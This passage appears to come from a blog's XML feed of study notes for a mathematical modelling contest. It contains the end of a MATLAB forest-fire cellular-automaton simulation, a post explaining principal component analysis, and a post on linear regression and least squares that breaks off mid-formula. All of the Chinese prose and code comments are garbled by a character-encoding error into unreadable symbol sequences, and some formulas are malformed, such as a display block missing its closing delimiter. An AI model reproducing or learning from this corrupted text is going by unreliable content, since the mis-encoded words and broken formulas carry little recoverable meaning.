class="hljs-comment">%å°†å…¶æ£®æ—çš„éƒ¨åˆ†æ’å…¥è¿™ä¸ªçŸ©é˜µä¸­</span><br><span class="hljs-comment">% çº¢è‰²è¡¨ç¤ºæ­£åœ¨ç‡ƒçƒ§(Sä¸­ç­‰äº2çš„ä½ç½®)% ç»¿è‰²è¡¨ç¤ºç»¿æ ‘(Sä¸­ç­‰äº1çš„ä½ç½®)% é»‘è‰²è¡¨ç¤ºç©ºæ ¼ä½(Sä¸­ç­‰äº0çš„ä½ç½®)</span><br>C=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">302</span>,<span class="hljs-number">302</span>,<span class="hljs-number">3</span>);<span class="hljs-comment">%æ„é€ ä¸€ä¸ª302*302*3çš„å¼ é‡ï¼ˆæ•°ç»„ï¼‰</span><br>R=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">300</span>);<span class="hljs-comment">%åˆå§‹åŒ–RçŸ©é˜µ</span><br>G=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">300</span>);<span class="hljs-comment">%åˆå§‹åŒ–GçŸ©é˜µ</span><br>R(S==<span class="hljs-number">2</span>)=<span class="hljs-number">1</span>;<span class="hljs-comment">%æ„æˆçš„å‘é‡çš„ä¸€ä¸ªä½ç½®ä¸Šå¯¹åº”çš„æ•°ä¸º2ï¼Œåˆ™ç»™Rèµ‹å€¼1</span><br>G(S==<span class="hljs-number">1</span>)=<span class="hljs-number">1</span>;<span class="hljs-comment">%æ„æˆçš„å‘é‡çš„ä¸€ä¸ªä½ç½®ä¸Šå¯¹åº”çš„æ•°ä¸º1ï¼Œåˆ™ç»™Rèµ‹å€¼1</span><br><br>C(<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">1</span>)=R;<span class="hljs-comment">%å°†Cçš„ç¬¬ä¸€å±‚èµ‹å€¼ä¸ºRçŸ©é˜µ</span><br>C(<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">2</span>)=G;<span class="hljs-comment">%å°†Cçš„ç¬¬äºŒå±‚èµ‹å€¼ä¸ºGçŸ©é˜µ</span><br><br>Ci=imshow(C);<span class="hljs-comment">%åœ¨å›¾çª—ä¸­æ˜¾ç¤ºç°åº¦å›¾åƒ I</span><br>ti=<span class="hljs-number">0</span>;<span class="hljs-comment">%åˆå§‹åŒ–æ—¶é—´</span><br>tp=title([<span class="hljs-string">&#x27;T = &#x27;</span>,num2str(ti)]);<span class="hljs-comment">%åœ¨æ ‡é¢˜å¤„æ˜¾ç¤ºæ—¶é—´</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span><br>    ti=ti+<span class="hljs-number">1</span>;<span class="hljs-comment">%æ—¶é—´çš„é€’å¢</span><br>    St=Sk;<span class="hljs-comment">%Stè¡¨ç¤ºtæ—¶åˆ»çš„æ£®æ—æƒ…å†µï¼ŒSkçŸ©é˜µä»£è¡¨ç€éšæœºå‡ºæ¥çš„æ£®æ—æƒ…å†µ</span><br>    St(Sk==<span class="hljs-number">2</span>)=<span class="hljs-number">0</span>;<span class="hljs-comment">%æ­£åœ¨ç‡ƒçƒ§çš„æ ‘å˜æˆç©ºæ ¼ä½ï¼Œç»è¿‡ä¸€ä¸ªæ—¶é—´é—´éš”å</span><br>    Su=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">302</span>);<span class="hljs-comment">%åˆå§‹åŒ–SuçŸ©é˜µ</span><br>    Sf=Sk;<span class="hljs-comment">%Sfåˆå§‹åŒ–ä¸ºSk</span><br>    Sf(Sf&lt;<span class="hljs-number">1.5</span>)=<span class="hljs-number">0</span>;<span class="hljs-comment">%å°†æ£®æ—ä¸­çš„ç©ºç™½ç‚¹å’Œæœ‰æ ‘çš„ç‚¹å»æ‰ï¼Œåªç•™ä¸‹ç€ç«ç‚¹</span><br>    Sf=Sf/<span class="hljs-number">2</span>;<span class="hljs-comment">%ç€ç«ç‚¹å˜ä¸º1ï¼Œæ­¤å¤„Sfåªæœ‰ç€ç«å’Œç©ºæ ¼ä¸¤ç§</span><br>    Su(<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">2</span>:<span class="hljs-number">301</span>)=Sf(<span class="hljs-number">1</span>:<span class="hljs-number">300</span>,<span class="hljs-number">1</span>:<span class="hljs-number">300</span>)+Sf(<span class="hljs-number">1</span>:<span class="hljs-number">300</span>,<span class="hljs-number">2</span>:<span class="hljs-number">301</span>)+Sf(<span class="hljs-number">1</span>:<span class="hljs-number">300</span>,<span class="hljs-number">3</span>:<span class="hljs-number">302</span>) +...<br>        Sf(<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">1</span>:<span class="hljs-number">300</span>)+Sf(<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">3</span>:<span class="hljs-number">302</span>)+Sf(<span class="hljs-number">3</span>:<span class="hljs-number">302</span>,<span class="hljs-number">1</span>:<span class="hljs-number">300</span>) + ...<br>        Sf(<span class="hljs-number">3</span>:<span class="hljs-number">302</span>,<span class="hljs-number">2</span>:<span class="hljs-number">301</span>)+Sf(<span class="hljs-number">3</span>:<span class="hljs-number">302</span>,<span class="hljs-number">3</span>:<span class="hljs-number">302</span>);<br>    <span class="hljs-comment">%å¯¹äºçŸ©é˜µä¸­çš„ä¸€ä¸ªç‚¹æ¥è¯´ï¼Œå‘¨å›´å…«ä¸ªç‚¹åªè¦æœ‰ä¸€ä¸ªç‚¹å¤§äº0ï¼Œé‚£ä¹ˆè¿™ä¸ªç‚¹å°±è¦å˜æˆç€ç«çŠ¶æ€ï¼ˆSf=2ï¼‰</span><br>    <span class="hljs-comment">%æ‰€ä»¥è¿™ä¸ªå‘½ä»¤æ˜¯å°†çŸ©é˜µä¸­çš„ä¸€ä¸ªç‚¹çš„å‘¨å›´å…«ä¸ªç‚¹çš„æ•°ç›¸åŠ ï¼Œè¿™ä¸ªæ•°å€¼å°±æ˜¯å‘¨å›´å…«ä¸ªç‚¹ç€ç«ç‚¹çš„ä¸ªæ•°</span><br>    St((Su&gt;<span class="hljs-number">0.5</span>)&amp;(Sk==<span class="hljs-number">1</span>))=<span class="hljs-number">2</span>;<span class="hljs-comment">%å¦‚æœç»¿æ ‘æ ¼ä½çš„æœ€è¿‘é‚»å±…ä¸­æœ‰ä¸€ä¸ªæ ‘åœ¨ç‡ƒçƒ§ï¼Œåˆ™å®ƒå˜æˆæ­£åœ¨ç‡ƒçƒ§çš„æ ‘ï¼›</span><br>    <br>    Se=Sk(<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">2</span>:<span class="hljs-number">301</span>);<span class="hljs-comment">%å°†Seåˆå§‹åŒ–ä¸ºæœ€åˆæ£®æ—</span><br>    Se(Se&lt;<span class="hljs-number">0.5</span>)=<span class="hljs-number">4</span>;<span class="hljs-comment">%% ç©ºç™½åœ°æ–¹èµ‹å€¼ä¸º4</span><br>    Se(Se&lt;<span class="hljs-number">3</span>)=<span class="hljs-number">0</span>;<span class="hljs-comment">%%æœ‰æ ‘å’Œç€ç«èµ‹å€¼ä¸º0</span><br>    Se(Se&gt;<span class="hljs-number">3</span>)=<span class="hljs-number">1</span>;<span class="hljs-comment">%%ç©ºç™½åœ°æ–¹èµ‹å€¼ä¸º1</span><br>    <span class="hljs-comment">%ä¸‰æ­¥æ“ä½œä¸€èµ·å°†ç©ºç™½å¤„å˜ä¸º1ï¼Œä¸æ˜¯ç©ºç™½å¤„å˜ä¸º0</span><br>    St(<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">2</span>:<span class="hljs-number">301</span>)=St(<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">2</span>:<span class="hljs-number">301</span>)+Se.*(<span class="hljs-built_in">rand</span>(<span class="hljs-number">300</span>)&lt;p);<br>    <span class="hljs-comment">%rand(300)&lt;pæ˜¯ä¸€ä¸ªåˆ¤æ–­çŸ©é˜µï¼Œå¯¹äºrand(300)è¿™ä¸ªçŸ©é˜µçš„æ¯ä¸€é¡¹ï¼Œå¦‚æœå°äºpé‚£ä¹ˆè¾“å‡º1ï¼Œåä¹‹è¾“å‡º0</span><br>    <span class="hljs-comment">%ä¹Ÿå°±æ˜¯åœ¨å°äºpæ—¶é•¿æ ‘ï¼Œå¤§äºpæ—¶ä¸é•¿æ ‘</span><br>    <span class="hljs-comment">%æ›´æ–°tæ—¶åˆ»çš„æ£®æ—St     </span><br>    Ss=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">302</span>);<span class="hljs-comment">%åˆå§‹åŒ–SsçŸ©é˜µ</span><br>    Ss(Sk==<span class="hljs-number">1</span>)=<span class="hljs-number">1</span>;<span class="hljs-comment">%%è®¨è®ºç»¿æ ‘æƒ…å†µ</span><br>    Ss(<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">2</span>:<span class="hljs-number">301</span>)=Ss(<span class="hljs-number">1</span>:<span class="hljs-number">300</span>,<span class="hljs-number">1</span>:<span class="hljs-number">300</span>)+Ss(<span class="hljs-number">1</span>:<span class="hljs-number">300</span>,<span class="hljs-number">2</span>:<span class="hljs-number">301</span>)+Ss(<span class="hljs-number">1</span>:<span class="hljs-number">300</span>,<span class="hljs-number">3</span>:<span class="hljs-number">302</span>) +...<br>        Ss(<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">1</span>:<span class="hljs-number">300</span>)+Ss(<span class="hljs-number">2</span>:<span class="hljs-number">301</span>,<span class="hljs-number">3</span>:<span class="hljs-number">302</span>)+Ss(<span class="hljs-number">3</span>:<span class="hljs-number">302</span>,<span class="hljs-number">1</span>:<span class="hljs-number">300</span>) + ...<br>        Ss(<span class="hljs-number">3</span>:<span class="hljs-number">302</span>,<span class="hljs-number">2</span>:<span class="hljs-number">301</span>)+Ss(<span class="hljs-number">3</span>:<span class="hljs-number">302</span>,<span class="hljs-number">3</span>:<span class="hljs-number">302</span>);<br>    <span class="hljs-comment">%è®°å½•çŸ©é˜µä¸­çš„ä¸€ä¸ªç‚¹çš„å‘¨å›´å…«ä¸ªç‚¹ä¸€å…±æœ‰å¤šå°‘æ£µæ ‘</span><br>    <span class="hljs-comment">%è¿™ä¸ªå¼å­æ±‚å‡ºçš„å€¼å°±æ˜¯ä¸€ä¸ªç‚¹å‘¨å›´æ ‘çš„ä¸ªæ•°</span><br>    Ss(Ss&lt;<span class="hljs-number">7.5</span>)=<span class="hljs-number">0</span>;<br>    Ss(Ss&gt;<span class="hljs-number">7.5</span>)=<span class="hljs-number">1</span>;<br>    <span class="hljs-comment">%å‘¨å›´çš„æ ‘ç­‰äº8æ£µæ—¶ï¼ŒSsèµ‹å€¼ä¸º1</span><br>    <span class="hljs-comment">%å‘¨å›´çš„æ ‘å°äº8æ£µæ—¶ï¼ŒSsèµ‹å€¼ä¸º0</span><br>    d=<span class="hljs-built_in">find</span>(Ss==<span class="hljs-number">1</span> &amp; Sk==<span class="hljs-number">1</span>);<span class="hljs-comment">%æŸ¥æ‰¾éé›¶å…ƒç´ çš„ç´¢å¼•å’Œå€¼</span><br>    <span class="hljs-comment">%è¿”å›ä¸€ä¸ªåŒ…å«æ•°ç»„ X ä¸­æ¯ä¸ªéé›¶å…ƒç´ çš„çº¿æ€§ç´¢å¼•çš„å‘é‡ã€‚</span><br>    <span class="hljs-keyword">for</span> k=<span class="hljs-number">1</span>:<span class="hljs-built_in">length</span>(d)<br>        r=<span class="hljs-built_in">rand</span>(<span class="hljs-number">1</span>);<br>        St(d(k))=<span class="hljs-built_in">round</span>(<span class="hljs-number">2</span>*(r&lt;=f)+(r&gt;f));<br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-comment">%åœ¨æœ€è¿‘çš„é‚»å±…ä¸­æ²¡æœ‰æ­£åœ¨ç‡ƒçƒ§çš„æ ‘çš„æƒ…å†µä¸‹æ ‘åœ¨æ¯ä¸€æ—¶æ­¥ä»¥æ¦‚ç‡f(é—ªç”µ)å˜ä¸ºæ­£åœ¨ç‡ƒçƒ§çš„æ ‘</span><br>    Sk=St;<span class="hljs-comment">%æ›´æ–°tæ—¶åˆ»çš„æ£®æ—St</span><br>    R=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">302</span>);<span class="hljs-comment">%åˆå§‹åŒ–RçŸ©é˜µ</span><br>    G=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">302</span>);<span class="hljs-comment">%åˆå§‹åŒ–GçŸ©é˜µ</span><br>    R(Sk==<span class="hljs-number">2</span>)=<span class="hljs-number">1</span>;<span class="hljs-comment">%å½“Skä¸­æ ‡è®°ä¸º2çš„ç‚¹ï¼Œä¹Ÿæ˜¯è¡¨ç¤ºç€ç«ç‚¹åˆ™åœ¨Rä¸­æ ‡è®°å‡ºæ¥</span><br>    G(Sk==<span class="hljs-number">1</span>)=<span class="hljs-number">1</span>;<span class="hljs-comment">%å½“Skä¸­æ ‡è®°ä¸º1çš„ç‚¹ï¼Œä¹Ÿæ˜¯è¡¨ç¤ºæ ‘çš„ç‚¹åœ¨Gä¸­æ ‡è®°å‡ºæ¥</span><br>  <br>    C(:,:,<span class="hljs-number">1</span>)=R;<span class="hljs-comment">%æŠŠCçš„ç¬¬ä¸€å±‚èµ‹å€¼ä¸ºR</span><br>    C(:,:,<span class="hljs-number">2</span>)=G;<span class="hljs-comment">%æŠŠCçš„ç¬¬äºŒå±‚èµ‹å€¼ä¸ºG</span><br>  <br>    set(Ci,<span class="hljs-string">&#x27;CData&#x27;</span>,C);<span class="hljs-comment">%ç¬¬ä¸€è¡Œæ˜¯æ˜¾ç¤ºå›¾åƒï¼ŒCæ˜¯å›¾åƒçš„çŸ©é˜µï¼ŒCiä¸Šé¢æœ‰å®šä¹‰ï¼Œæ˜¯æ˜¾ç¤ºå›¾åƒã€‚</span><br>    set(tp,<span class="hljs-string">&#x27;string&#x27;</span>,[<span class="hljs-string">&#x27;T = &#x27;</span>,num2str(ti)]);<span class="hljs-comment">%ç¬¬äºŒè¡Œæ˜¯è®¾ç½®å›¾åƒçš„æ ‡é¢˜ï¼Œæ˜¾ç¤ºT=å½“å‰æ—¶åˆ»</span><br>    pause(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><hr><p>æ‘˜è‡ªï¼š<a href="https://zhuanlan.zhihu.com/p/113204715">https://zhuanlan.zhihu.com/p/113204715</a></p>]]></content>
    
    
    <categories>
      
      <category>MCM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MCM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PCA</title>
    <link href="/2024/01/30/PCA/"/>
    <url>/2024/01/30/PCA/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸»æˆåˆ†åˆ†æç®€è¿°"><a href="#ä¸»æˆåˆ†åˆ†æç®€è¿°" class="headerlink" title="ä¸»æˆåˆ†åˆ†æç®€è¿°"></a>ä¸»æˆåˆ†åˆ†æç®€è¿°</h1><p>ä¸»æˆåˆ†åˆ†ææ³•é€šè¿‡ç ”ç©¶å°‘æ•°å‡ ä¸ªä¸»æˆåˆ†æ¥è§£é‡Šå¤šä¸ªå˜é‡ä¹‹é—´çš„å†…éƒ¨ç»“æ„ï¼Œå³ä»åŸå§‹å˜é‡ä¸­å¯¼å‡ºå°‘æ•°å‡ ä¸ªä¸»åˆ†é‡ï¼Œä½¿å®ƒä»¬å°½å¯èƒ½çš„ä¿ç•™åŸå§‹å˜é‡çš„ä¿¡æ¯ï¼Œä¸”å½¼æ­¤ä¹‹é—´äº’ä¸ç›¸å…³ã€‚</p><p>ä¸»æˆåˆ†åˆ†æçš„ç›®çš„ï¼šæ•°æ®çš„å‹ç¼©å’Œæ•°æ®çš„è§£é‡Šã€‚</p><h2 id="åŸºæœ¬æ€æƒ³"><a href="#åŸºæœ¬æ€æƒ³" class="headerlink" title="åŸºæœ¬æ€æƒ³"></a>åŸºæœ¬æ€æƒ³</h2><p>ä¸»æˆåˆ†åˆ†ææ³•å°±æ˜¯è®¾æ³•å°†åŸæ¥ä¼—å¤šçš„å…·æœ‰ä¸€å®šç›¸å…³æ€§çš„å˜é‡ï¼ˆå¦‚På˜é‡ï¼‰ï¼Œé‡æ–°ç»„åˆæˆä¸€ç»„æ–°çš„ç›¸äº’æ— å…³çš„å˜é‡ã€‚</p><p>åœ¨æ•°å­¦ä¸Šï¼Œå°±æ˜¯å°†åŸæ¥pä¸ªå˜é‡ä½œçº¿æ€§ç»„åˆä½œä¸ºæ–°çš„ç»¼åˆå˜é‡ã€‚</p><p>æœ€ç»å…¸çš„æ–¹æ³•å°±æ˜¯ç”¨æ–¹å·®æ¥è¡¡é‡ã€‚è®¾æˆ‘ä»¬é€‰å–çš„æ•°æ®é›†ä¸º $F_{1}$, $var(F_{1})$ è¶Šå¤§ï¼Œè¯´æ˜ $F_{1}$ æ‰€åŒ…å«çš„ä¿¡æ¯è¶Šå¤šã€‚å› æ­¤åœ¨æ‰€æœ‰çš„çº¿æ€§ç»„åˆä¸­é€‰å–çš„ $F_{1}$ åº”è¯¥æ˜¯æ–¹å·®æœ€å¤§çš„ï¼Œç§°ä¸º<strong>ç¬¬ä¸€ä¸»æˆåˆ†</strong>ã€‚</p><p>å¦‚æœç¬¬ä¸€ä¸»æˆåˆ†ä¸è¶³ä»¥ä»£è¡¨åŸæ¥pä¸ªå˜é‡çš„ä¿¡æ¯ï¼Œå†è€ƒè™‘é€‰å– $F_{2}$ ä¸ºç¬¬äºŒä¸»æˆåˆ†ã€‚</p><p>ä¸ºäº†æœ‰æ•ˆååº”åŸæ¥çš„å…³ç³»ï¼Œæˆ‘ä»¬ä¸€èˆ¬è¦æ±‚ $F_{1},F_{2}$ ä¸å«é‡å¤ä¿¡æ¯ã€‚</p><p>åœ¨å®é™…ä¸­ï¼Œå¦‚æœå„ä¸»æˆåˆ†çš„ç´¯è®¡æ–¹å·®è´¡çŒ®ç‡&gt;80%æˆ–ç‰¹å¾æ ¹&gt;1ï¼Œåˆ™æ»¡è¶³å»ºæ¨¡è¦æ±‚ã€‚</p><h2 id="æ•°å­¦æ¨¡å‹"><a href="#æ•°å­¦æ¨¡å‹" class="headerlink" title="æ•°å­¦æ¨¡å‹"></a>æ•°å­¦æ¨¡å‹</h2><p>æˆ‘ä»¬å‡å®šæœ‰nä¸ªåœ°ç†æ ·æœ¬ï¼Œæ¯ä¸ªæ ·æœ¬æœ‰pä¸ªå˜é‡ï¼Œæ„æˆä¸€ä¸ªn*pçš„çŸ©é˜µ</p><p>$$<br>X_{i}&#x3D;\begin{bmatrix}<br>  x_{11}&amp;x_{12}  &amp;\ldots&amp;x_{1p} \\<br>  x_{21}&amp;x_{22}  &amp;\ldots&amp;x_{2p} \\<br>  \ldots&amp; &amp; &amp;\ldots \\<br>  x_{n1}&amp;x_{n2}  &amp;\ldots&amp;x_{np}<br>\end{bmatrix}<br>$$</p><p>å½“pæ¯”è¾ƒå¤§æ—¶ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œé™ç»´å¤„ç†ï¼Œç”¨è¾ƒå°‘çš„ç»¼åˆå˜é‡ä»£æ›¿åŸæ¥è¾ƒå¤šçš„å˜é‡ã€‚å¹¶å°½å¯èƒ½åæ˜ åŸå§‹å˜é‡çš„ç‰¹å¾ã€‚</p><p>ä¸€ç§æ¯”è¾ƒç®€å•çš„æ–¹æ³•æ˜¯ä½œçº¿æ€§å˜æ¢ï¼Œä½¿æ–°çš„ç»¼åˆå˜é‡å˜ä¸ºåŸå˜é‡çš„çº¿æ€§ç»„åˆ</p><p>$$\begin{cases}<br>F_{1}&#x3D;a_{11}x_{1}+\ldots+a_{p1}x_{p}\\<br>F_{2}&#x3D;a_{12}x_{1}+\ldots+a_{p2}x_{p}\\<br>\ldots \\<br>F_{p}&#x3D;a_{1p}x_{1}+\ldots+a_{pp}x_{p}<br>\end{cases}$$</p><p>å¯¹äºä»»æ„å¸¸æ•°ï¼Œæˆ‘ä»¬è¦æ±‚ $var(cF_{i})&#x3D;c^{2}var(F_{i})$</p><p>ä¸ºäº†ä½¿æ–¹å·®å¯ä»¥æ¯”è¾ƒï¼Œæˆ‘ä»¬è¦æ±‚çº¿æ€§ç»„åˆçš„ç³»æ•°æ»¡è¶³ $\sum_{i&#x3D;1}^{p}a_{ki}^{2}&#x3D;1$</p><p>å„å˜é‡ä¹‹é—´äº’ä¸ç›¸å…³ï¼Œåæ–¹å·®ä¸º0.</p><p>åœ¨å»ºæ¨¡å‰ï¼Œéœ€è¦è¿›è¡Œæ•°æ®å¤„ç†ï¼Œå³æ ‡å‡†åŒ–å¤„ç†ã€‚å˜é‡ä¹‹é—´çš„åæ–¹å·®å³ä¸ºç›¸å…³ç³»æ•°ã€‚</p><p>è¿™é‡Œç›´æ¥ç»™å‡ºç»“è®ºï¼š</p><p>é€šè¿‡æ¨å¯¼å¯çŸ¥ï¼Œ $X_{i}$ çš„ä¸»æˆåˆ†å°±æ˜¯ä»¥åæ–¹å·®é˜µ $\sum$ çš„ç‰¹å¾å‘é‡ä¸ºç³»æ•°çš„çº¿æ€§ç»„åˆï¼Œå…¶æ–¹å·®ä¸ºåæ–¹å·®é˜µçš„ç‰¹å¾æ ¹ã€‚</p><p>ä¸»æˆåˆ†çš„åæ¬¡ä½¿æŒ‰ç‰¹å¾å€¼å–å€¼çš„å¤§å°çš„é¡ºåºæ’åˆ—çš„ã€‚</p><p><strong>ä¸‹é¢å®šä¹‰è´¡çŒ®ç‡å’Œç´¯è®¡è´¡çŒ®ç‡ï¼š</strong></p><p>è´¡çŒ®ç‡</p><p>$$\frac{\lambda_{1}}{\sum_{i&#x3D;1}^{p}\lambda_{i}} ç§°ä¸ºç¬¬ä¸€ä¸»æˆåˆ†çš„è´¡çŒ®ç‡ã€‚</p><p>$$var(F_{1})&#x3D;\lambda_{1}$$</p><p>å› æ­¤ç¬¬ä¸€ä¸»æˆåˆ†çš„è´¡çŒ®ç‡è¶Šå¤§ï¼Œè¡¨æ˜å…¶ç»¼åˆå„æˆåˆ†çš„èƒ½åŠ›è¶Šå¼ºã€‚</p><p>å„æˆåˆ†çš„è´¡çŒ®ç‡çš„åŠ å’Œå°±ä¸ºç´¯è®¡è´¡çŒ®ç‡ã€‚</p><h2 id="æ£€éªŒæ–¹æ³•"><a href="#æ£€éªŒæ–¹æ³•" class="headerlink" title="æ£€éªŒæ–¹æ³•"></a>æ£€éªŒæ–¹æ³•</h2><ol><li>KMOæ£€éªŒ</li><li>Bartlettâ€™sæ£€éªŒ</li></ol>]]></content>
    
    
    <categories>
      
      <category>MCM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MCM</tag>
      
      <tag>PCA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>çº¿æ€§å›å½’</title>
    <link href="/2024/01/30/RA/"/>
    <url>/2024/01/30/RA/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€å…ƒçº¿æ€§å›å½’"><a href="#ä¸€å…ƒçº¿æ€§å›å½’" class="headerlink" title="ä¸€å…ƒçº¿æ€§å›å½’"></a>ä¸€å…ƒçº¿æ€§å›å½’</h1><p>ä¸€èˆ¬çš„ï¼Œæˆ‘ä»¬ç§°ç”± $y&#x3D;\beta_{0}+\beta_{1}x+\varepsilon $ ç¡®å®šçš„æ¨¡å‹ä¸ºä¸€å…ƒçº¿æ€§å›å½’æ¨¡å‹ï¼Œè®°ä¸º</p><p>$$\begin{cases}<br>y&#x3D;\beta_{0}+\beta_{1}x+\varepsilon \\<br>E(\varepsilon)&#x3D;0,D(\varepsilon)&#x3D;\sigma^{2}<br>\end{cases}$$</p><p>å›ºå®šçš„æœªçŸ¥å‚æ•° $\beta_{0},\beta_{1}$ ç§°ä¸ºå›å½’ç³»æ•°ï¼Œè‡ªå˜é‡xç§°ä¸ºå›å½’å˜é‡ã€‚</p><p>$Y&#x3D;\beta_{0}+\beta_{1}x$ ç§°ä¸º<strong>yå¯¹xçš„å›å½’ç›´çº¿æ–¹ç¨‹ã€‚</strong></p><p>ä¸€å…ƒçº¿æ€§å›å½’çš„ä¸»è¦ä»»åŠ¡ï¼š</p><ol><li>ç”¨è¯•éªŒå€¼ï¼ˆæ ·æœ¬å€¼ï¼‰å¯¹ $\beta_{0},\beta_{1},\varepsilon$ ä½œä¼°è®¡</li><li>ç”¨å›å½’ç³»æ•°ä½œå‡è®¾æ£€éªŒ</li><li>åœ¨ $x&#x3D;x_{0}$ å¤„ä½œé¢„æµ‹å¾—å‡º $\hat y$ ï¼Œå¯¹yä½œåŒºé—´ä¼°è®¡</li></ol><h2 id="æ™®é€šæœ€å°äºŒä¹˜æ³•ï¼ˆOLSï¼‰"><a href="#æ™®é€šæœ€å°äºŒä¹˜æ³•ï¼ˆOLSï¼‰" class="headerlink" title="æ™®é€šæœ€å°äºŒä¹˜æ³•ï¼ˆOLSï¼‰"></a>æ™®é€šæœ€å°äºŒä¹˜æ³•ï¼ˆOLSï¼‰</h2><p>åœ¨å·²çŸ¥æ•°æ®çš„åŸºç¡€ä¸Šï¼Œæ‹Ÿåˆå‡ºå‡½æ•°æ›²çº¿è¿›è¡Œé¢„æµ‹ã€‚</p><p>è¯„åˆ¤å›å½’ç²¾åº¦çš„æ ‡å‡†æ˜¯ï¼šæ ·æœ¬å›å½’çº¿ä¸Šçš„ç‚¹ä¸çœŸå®è§‚æµ‹ç‚¹çš„è¯¯å·®åº”è¯¥å°½å¯èƒ½å°ã€‚</p><p>OLSç»™å‡ºçš„åˆ¤æ–­æ ‡å‡†æ˜¯ï¼šäºŒè€…ä¹‹å·®çš„å¹³æ–¹å’Œæœ€å°ï¼Œå³</p><p>$$Q&#x3D;\sum_{i&#x3D;1}^{n}(Y_{i}-\hat Y_{i})^(2)&#x3D;\sum_{i&#x3D;1}^{n}(Y_{i}-(\hat \beta_{0}+\beta_{1}X_{i}))^{2}$$</p><p>ç”±äºQæ˜¯å…³äº $\hat \beta_{0},\hat \beta_{1}$ çš„äºŒæ¬¡å‡½æ•°ä¸”éè´Ÿï¼Œæ•…æå°å€¼å­˜åœ¨ã€‚</p><p>$$\begin{cases}<br>\frac{\partial Q}{\partial \hat \beta_{0}}&#x3D;0 \\<br> \\<br>\frac{\partial Q}{\partial \hat \beta_{1}}&#x3D;0<br>\end{cases}$$</p><p>ç»“æœä¸ºï¼š</p><p>$$\begin{cases}<br>\hat \beta_{1}&#x3D;\frac{n\sum Y_{i}X_{i}-\sum Y_{i}\sum X_{i}}{n\sum X_{i}^{2}-(\sum X_{i})^{2}} \\<br> \\<br>\hat \beta_{0}&#x3D;\bar Y-\hat \beta_{1} \bar X<br>\end{cases}$$</p><blockquote><p>å…¶å®å°±æ˜¯é«˜ä¸­çš„æœ€å°äºŒä¹˜æ³•ï¼Œåˆ«è¢«å“åˆ°äº†ã€‚</p></blockquote><p>ç¦»æ•£å½¢å¼çš„ç‰ˆæœ¬ï¼š</p><p>$$\begin{cases}<br>\bar X&#x3D;\frac{1}{n} \sum X_{i} \\<br>\bar Y&#x3D;\frac{1}{n} \sum Y_{i} \\<br>x_{i}&#x3D;X_{i}-\bar X \\<br>y_{i}&#x3D;Y_{i}-\bar Y<br>\end{cases}$$</p><p>$$\begin{cases}<br>\hat \beta_{1}&#x3D;\frac{\sum x_{i}y_{i}}{\sum x_{i}^{2}} \\<br> \\<br>\hat \beta_{0}&#x3D;\bar Y-\hat \beta_{1} \bar X<br>\end{cases}$$</p><h2 id="éšæœºè¯¯å·®é¡¹æ–¹å·®çš„ä¼°è®¡é‡"><a href="#éšæœºè¯¯å·®é¡¹æ–¹å·®çš„ä¼°è®¡é‡" class="headerlink" title="éšæœºè¯¯å·®é¡¹æ–¹å·®çš„ä¼°è®¡é‡"></a>éšæœºè¯¯å·®é¡¹æ–¹å·®çš„ä¼°è®¡é‡</h2><p>è®° $e_{i}&#x3D;Y_{i}-\hat Y_{i}$ ä¸ºæ®‹å·®ï¼Œåˆ™éšæœºè¯¯å·®é¡¹æ–¹å·®çš„ä¼°è®¡é‡ä¸ºï¼š</p><p>$$\hat \delta_{e}^{2}&#x3D;\frac{\sum e_{i}^{2}}{n-2}$$</p><h2 id="å›å½’æ–¹ç¨‹çš„æ˜¾è‘—æ€§æ£€éªŒ"><a href="#å›å½’æ–¹ç¨‹çš„æ˜¾è‘—æ€§æ£€éªŒ" class="headerlink" title="å›å½’æ–¹ç¨‹çš„æ˜¾è‘—æ€§æ£€éªŒ"></a>å›å½’æ–¹ç¨‹çš„æ˜¾è‘—æ€§æ£€éªŒ</h2><p>å¯¹å›å½’æ–¹ç¨‹çš„æ˜¾è‘—æ€§æ£€éªŒï¼Œå½’ç»“ä¸ºå¯¹å‡è®¾</p><p>$$H_{0}:\beta_{1}&#x3D;0,H_{1}:\beta_{1}\ne 0$$</p><p>è‹¥ $H_{0}$ ä¸æˆç«‹ï¼Œè¯´æ˜å›å½’æ–¹ç¨‹é€šè¿‡æ£€æµ‹ã€‚</p><ol><li><em>F</em>æ£€éªŒæ³•</li></ol><p>$$F&#x3D;\frac{U}{Q_{e}&#x2F;(n-2)} ~ F(1,n-2)$$</p><p>å…¶ä¸­ $U&#x3D;\sum_{i&#x3D;1}^{n}(\hat y_{i}-\bar y)^{2}$ ï¼ˆå›å½’å¹³æ–¹å’Œï¼‰</p><p>$Q_{e}&#x3D;\sum_{i&#x3D;0}^{n}(y_{i}-\hat y_{i})^{2}$ ï¼ˆæ®‹å·®å¹³æ–¹å’Œï¼‰</p><p>$1-\alpha$ 